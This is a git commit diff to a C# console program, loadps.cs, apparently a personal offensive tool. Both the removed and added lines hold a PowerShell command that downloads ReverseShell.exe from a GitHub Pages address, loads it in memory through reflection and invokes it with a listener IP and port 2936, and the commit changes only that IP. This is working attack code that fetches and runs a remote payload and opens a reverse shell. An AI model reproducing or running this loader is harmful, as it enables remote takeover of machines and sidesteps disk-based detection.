469f9067b99ec445078d25f864cfdd3ff0cd59d0
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2024-08-23 09:55:23 +0900

    Update loadps.cs

--- loadps.cs
+++ loadps.cs
@@ -15,7 +15,7 @@ namespace ConsoleApp
         {
 
             var ps1File = @"E:\Programming\Powershell\test.ps1";
-            var command = @"$bytes=(New-Object Net.WebClient).DownloadData('https://hakkyahud.github.io/ReverseShell.exe');$assembly=[System.Reflection.Assembly]::Load($bytes);$entryPoint=$assembly.EntryPoint;[String[]]$parameter=@('192.168.80.130', '2936');$entryPoint.Invoke($null, (,$parameter));pause";
+            var command = @"$bytes=(New-Object Net.WebClient).DownloadData('https://hakkyahud.github.io/ReverseShell.exe');$assembly=[System.Reflection.Assembly]::Load($bytes);$entryPoint=$assembly.EntryPoint;[String[]]$parameter=@('192.168.1.110', '2936');$entryPoint.Invoke($null, (,$parameter));pause";
 
             var startInfo = new ProcessStartInfo()
             {
